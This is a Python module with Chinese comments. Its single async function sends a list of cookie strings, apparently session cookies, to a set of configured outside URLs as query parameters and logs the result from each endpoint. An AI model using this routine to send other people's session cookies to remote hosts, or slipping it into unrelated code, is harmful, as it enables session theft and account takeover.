from urllib.parse import quote

import httpx
from loguru import logger

from config import REPORT_URLS


async def report_cookies(payloads: list[str]) -> list[dict]:
    """
    上报 Cookie，返回逐条详细结果。
    每条: {'cookie': 'SESSION=xxx...', 'results': [{'url': 'slinghang', 'ok': True, 'error': None}, ...]}
    """
    if not payloads:
        return []

    reports = []

    async with httpx.AsyncClient(timeout=10) as client:
        for cookie_str in payloads:
            entry = {'cookie': cookie_str[:60], 'results': []}
            for base_url in REPORT_URLS:
                url = f'{base_url}?cookie={quote(cookie_str)}'
                short_name = base_url.split('//')[1].split('.')[0]
                try:
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        body = resp.text
                        # 检查响应体是否包含错误信息
                        if '"code":0' in body or '"success":true' in body.lower() or len(body) < 5:
                            entry['results'].append({'url': short_name, 'ok': True, 'error': None})
                            logger.debug(f'上报成功: {short_name} ← {cookie_str[:40]}...')
                        else:
                            entry['results'].append({'url': short_name, 'ok': False, 'error': body[:100]})
                            logger.warning(f'上报返回异常: {short_name} ← {body[:100]}')
                    else:
                        entry['results'].append({'url': short_name, 'ok': False, 'error': f'HTTP {resp.status_code}'})
                        logger.warning(f'上报异常 HTTP {resp.status_code}: {short_name}')
                except Exception as e:
                    entry['results'].append({'url': short_name, 'ok': False, 'error': str(e)[:50]})
                    logger.error(f'上报失败: {short_name} → {e}')
            reports.append(entry)

    return reports
